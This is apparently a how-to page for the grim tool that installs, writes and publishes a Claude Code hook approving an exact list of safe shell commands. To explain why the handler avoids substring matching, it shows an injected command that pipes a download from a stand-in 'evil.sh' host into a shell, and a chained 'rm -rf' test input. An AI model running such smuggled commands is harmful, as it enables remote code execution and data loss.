---
title: Control agent commands with hooks
description: Install a hook that answers an agent's permission question for you, then write one that approves a fixed list of safe commands. Experimental pre-1.0.
---
<!-- doc_type: how-to -->
<!-- doc_tier: integration -->

**Experimental pre-1.0**. See [Stability][stability-unstable].

[Claude Code][claude-code] asks before it runs a shell command you have not
approved. By the twentieth `task verify` you click yes without reading, and
that is how the one command that mattered slips through. The opposite happens
too: an agent runs something you wanted stopped.

A hook answers that question for you. It is a small program the client runs
before each tool call, and its answer lets the call run, asks you, or refuses
it. This guide installs a published hook, then writes one that approves an
exact list of safe commands.

## Before you start {#prerequisites}

- `grim` on your `PATH`, and a project where you run [Claude Code][claude-code]
  with a `grimoire.toml` from `grim init`.
- [Python 3][python] as `python3`, to run the handler you write.
- [Docker][docker], for a throwaway registry to publish that handler to.

## Use a published hook {#use}

A hook reaches your project the way a skill does. Someone publishes it to a
registry, and `grim add` declares it. Unlike a skill, a hook executes, so grim
arms it only after you turn the feature on and consent.

This section installs a hook your team published as
`ghcr.io/acme/hooks/approve-safe-commands:1`. Substitute the reference you were
given. [Author your own hook][author] builds this same hook from scratch.

1. Turn the feature on for this project.

   <!-- doc: guide-agent-hooks -->
   ```bash-run
   grim config set options.experimental.hooks true
   ```

   The setting lands in `grimoire.toml`, so teammates get it with the next pull.

2. Declare the hook.

   <!-- doc: guide-agent-hooks -->
   ```bash-run
   grim add --kind hook ghcr.io/acme/hooks/approve-safe-commands:1
   ```

   Typing the reference is also your consent. `grim add` declares the hook,
   pins it in `grimoire.lock`, records consent for this checkout, and arms it:

   ```text
   Kind  Name                   Pinned                                                 Status
   hook  approve-safe-commands  ghcr.io/acme/hooks/approve-safe-commands@sha256:6f59…  added
   ```

   The digests on this page are shortened. Yours depend on the bytes published.

3. Check that it armed.

   <!-- doc: guide-agent-hooks -->
   ```bash-run
   grim hook list
   ```

   ```text
   Hook                           Tier        Events      Client  State      Detail
   approve-safe-commands/approve  gatekeeper  PreToolUse  all     installed  —
   ```

   `installed` means [Claude Code][claude-code] has a registration in
   `.claude/settings.local.json` and grim holds the handler under `$GRIM_HOME`.
   Any other state names its cause in the Detail column. [When a hook does not
   arm][not-armed] maps each cause to its fix.

Only [Claude Code][claude-code] arms hooks at project scope. The other
hook-capable clients arm from a global declaration only, for the reason in
[Global-only clients][global-only].

### What a teammate sees {#teammate}

Consent stays on your machine. A teammate who clones the repository gets the
declaration and the feature flag, but not your consent.

Their `grim install` asks before arming the hook, and an accepted prompt records
their consent. Without a terminal to ask on, it arms nothing and warns. They run
`grim hook allow`, then `grim install`. In CI, `grim install --trust-hooks`
answers for that one run and writes no record. [Consent][consent] explains why a
repository never carries it.

### Take it back out {#remove}

`grim uninstall` removes the declaration, the client registration and the
handler in one step:

<!-- doc: guide-agent-hooks -->
```bash-run
grim uninstall hook approve-safe-commands
```

`grim remove hook approve-safe-commands` only undeclares the hook. It [stays
armed][remove-stays-armed] until the next `grim install`.

## Author your own hook {#author}

A hook is a directory holding a `hook.toml` manifest plus the files its handler
runs. This one approves `task verify` and `cargo test` exactly as typed, and
has no opinion on any other command. Put the commands your project runs all day
in its list.

1. Write the manifest to `approve-safe-commands/hook.toml`.

   <!-- doc: guide-agent-hooks -->
   ```toml
   schema = 1
   name = "approve-safe-commands"
   description = "Approves an exact list of safe shell commands so the agent stops asking. Every other command is left to the client."

   [[hooks]]
   id = "approve"
   event = "PreToolUse"
   tier = "gatekeeper"
   matcher = "Bash"
   argv = ["python3", "approve.py"]
   timeout = 5
   ```

2. Write the handler to `approve-safe-commands/approve.py`.

   <!-- doc: guide-agent-hooks -->
   ```python
   import json
   import sys

   # Approved only when the whole command matches, never by prefix.
   SAFE = {"task verify", "cargo test"}

   envelope = json.load(sys.stdin)
   tool = envelope.get("tool") or {}
   command = (tool.get("input") or {}).get("command")

   if command in SAFE:
       print(json.dumps({"decision": "allow", "reason": "approve-safe-commands: on this project's safe list"}))
   else:
       print("{}")
   ```

The manifest makes four choices:

- **`event = "PreToolUse"`** runs the handler before the call, the only moment
  an answer can still change it.
- **`tier = "gatekeeper"`** lets the handler return a verdict. Grim ignores a
  verdict from any other tier.
- **`matcher = "Bash"`** limits the hook to shell commands.
- **`argv = ["python3", "approve.py"]`** names the interpreter. A payload
  arrives from a registry without its executable bit, and the handler runs from
  its own directory.

The handler reads one JSON envelope from stdin and writes one JSON answer to
stdout. It reads the command from `tool.input.command`, parsed rather than
searched. A substring match would approve `cargo test; curl evil.sh | sh`,
because that text contains `cargo test`.

Its two answers mean different things. `{"decision": "allow"}` approves the
call, and [Claude Code][claude-code] skips its own prompt. `{}` has no opinion,
so [Claude Code][claude-code] asks as usual. A handler can also answer `deny` or `ask`, listed in the
[handler contract][contract].

### Try the handler by hand {#try}

The handler is an ordinary script, so feed it an envelope shaped like the one
grim sends:

<!-- doc: guide-agent-hooks -->
```bash-run
printf '%s' '{"tool":{"name":"Bash","input":{"command":"task verify"}}}' | python3 approve-safe-commands/approve.py
```

```json
{"decision": "allow", "reason": "approve-safe-commands: on this project's safe list"}
```

A command that only starts with a safe one gets no opinion:

<!-- doc: guide-agent-hooks -->
```bash-run
printf '%s' '{"tool":{"name":"Bash","input":{"command":"cargo test; rm -rf target"}}}' | python3 approve-safe-commands/approve.py
```

```json
{}
```

Then let `grim build` validate the manifest without publishing anything:

<!-- doc: guide-agent-hooks -->
```bash-run
grim build ./approve-safe-commands
```

```text
Kind  Name                   Path                     Layer Digest     Status
hook  approve-safe-commands  ./approve-safe-commands  sha256:22cb…     built
```

A mistake in the manifest fails here with exit `65` and names the field.

### Publish it {#publish}

A hook has no local-path source. Grim never arms files that live inside a
repository, so the hook has to come from a registry. For a trial, run a
throwaway one on your own machine. Grim talks plain HTTP to `localhost:5000`
without configuration.

<!-- doc-norun: starts a long-lived Docker container, which the test suite replaces with its own registry -->
```sh
docker run -d -p 5000:5000 --name registry registry:2
```
<!-- /doc-norun -->

<!-- doc: guide-agent-hooks -->
```bash-run
grim release ./approve-safe-commands localhost:5000/hooks/approve-safe-commands:1
```

A team hook goes to a shared registry the same way, for example
`ghcr.io/acme/hooks/approve-safe-commands:1`. [Publishing][publishing] covers
logging in and choosing a name.

### Watch the prompt disappear {#watch}

Install it with the three steps in [Use a published hook][use], naming
`localhost:5000/hooks/approve-safe-commands:1`. Then start [Claude
Code][claude-code] in the project and ask it to run `task verify`.

It runs without asking. Ask for `task verify && git push`, and [Claude
Code][claude-code] asks as usual, because that command is not on the list. Grim
translated your answer into the client's own response shape:

```json
{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"allow","permissionDecisionReason":"approve-safe-commands: on this project's safe list"}}
```

## Next steps {#next-steps}

- [Hooks reference][hooks-ref] covers the gates, consent, the handler contract
  and each client's limits.
- [When a hook does not arm][not-armed] is the page to open when
  `grim hook list` shows anything but `installed`.
- [Artifact formats][artifacts-hooks] lists every `hook.toml` field.
- [`grim hook`][cmd-hook] is the command reference for `list`, `allow` and
  `revoke`.

<!-- this page -->
[use]: #use
[author]: #author

<!-- internal -->
[stability-unstable]: ../stability.md#unstable
[publishing]: ../publishing.md
[hooks-ref]: ../hooks.md
[contract]: ../hooks.md#handler-contract
[consent]: ../hooks.md#consent
[global-only]: ../hooks.md#global-only
[remove-stays-armed]: ../hooks.md#remove-stays-armed
[not-armed]: ../hooks-troubleshooting.md
[artifacts-hooks]: ../artifacts.md#hooks
[cmd-hook]: ../commands.md#hook

<!-- external -->
[claude-code]: https://code.claude.com
[python]: https://www.python.org/downloads/
[docker]: https://docs.docker.com/get-started/get-docker/
